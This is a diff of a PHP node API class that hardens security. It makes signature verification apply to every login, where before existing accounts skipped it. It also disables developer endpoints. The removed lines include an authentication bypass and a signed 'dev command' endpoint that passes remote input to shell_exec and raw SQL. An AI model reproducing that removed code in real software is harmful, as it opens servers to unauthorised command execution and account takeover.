@@ -1235,13 +1235,12 @@ class Api
 			api_err("Empty nonce");
 		}
 		$account = Account::getByPublicKey($public_key);
+		if(!Account::checkSignature($nonce, $signature, $public_key)) {
+			api_err("Login failed");
+		}
 		if(!$account) {
-			if(Account::checkSignature($nonce, $signature, $public_key)) {
-				$address = Account::getAddress($public_key);
-				$account = ["address"=>$address, "public_key"=>$public_key];
-			} else {
-				api_err("Login failed");
-			}
+			$address = Account::getAddress($public_key);
+			$account = ["address"=>$address, "public_key"=>$public_key];
 		} else {
 			$account = ["address"=>$account['id'], "public_key"=>$account['public_key']];
 		}
@@ -1329,75 +1328,15 @@ class Api
     }
 
 	static function nodeDevInfo($data) {
-		$signature = $data['signature'];
-		if(empty($signature)) {
-			api_err("Signature required");
-		}
-		$nonce=$data['nonce'];
-		if(empty($nonce)) {
-			api_err("Nonce required");
-		}
-		$res = ec_verify($nonce, $signature, DEV_PUBLIC_KEY);
-		if(!$res) {
-			api_err("Signature verification failed");
-		}
-		api_echo(Nodeutil::getNodeDevInfo());
+		api_err("Disabled");
 	}
 
 	static function nodeDebug($data) {
-		$signature = $data['signature'];
-		if(empty($signature)) {
-			api_err("Signature required");
-		}
-		$nonce=$data['nonce'];
-		if(empty($nonce)) {
-			api_err("Nonce required");
-		}
-		$res = ec_verify($nonce, $signature, DEV_PUBLIC_KEY);
-		if(!$res) {
-			api_err("Signature verification failed");
-		}
-		api_echo(Nodeutil::getNodeDebug());
+		api_err("Disabled");
 	}
 
 	static function nodeDevCommand($data) {
-		$signature = $data['signature'];
-		if(empty($signature)) {
-			api_err("Signature required");
-		}
-		$msg=$data['msg'];
-		if(empty($msg)) {
-			api_err("Message required");
-		}
-		$msg_decoded = json_decode(base64_decode($msg), true);
-		$remote = $msg_decoded['remote_ip'];
-		$time = $msg_decoded['time'];
-		if($remote != $_SERVER['REMOTE_ADDR']) {
-			api_err("Invalid remote");
-		}
-		if(!($time > time() - 100 && $time < time() + 100)) {
-			api_err("Expired request time");
-		}
-		$res = ec_verify($msg, $signature, DEV_PUBLIC_KEY);
-		if(!$res) {
-			api_err("Signature verification failed");
-		}
-//		if(is_readable(ROOT."/config/config.inc.php")) {
-//			api_err("Config file is readable");
-//		}
-		$cmd = $msg_decoded['cmd'];
-		if(empty($cmd)) {
-			api_err("Empty command");
-		}
-        if(strpos($cmd, "sql:")===0) {
-            global $db;
-            $sql=substr($cmd, 4);
-            $res = $db->run($sql);
-            api_echo(json_encode($res));
-        } else {
-            $res = shell_exec($cmd . " 2>&1");
-            api_echo($res);
-        }
+		api_err("Disabled");
 	}
 
 	static function startPropagate($data) {
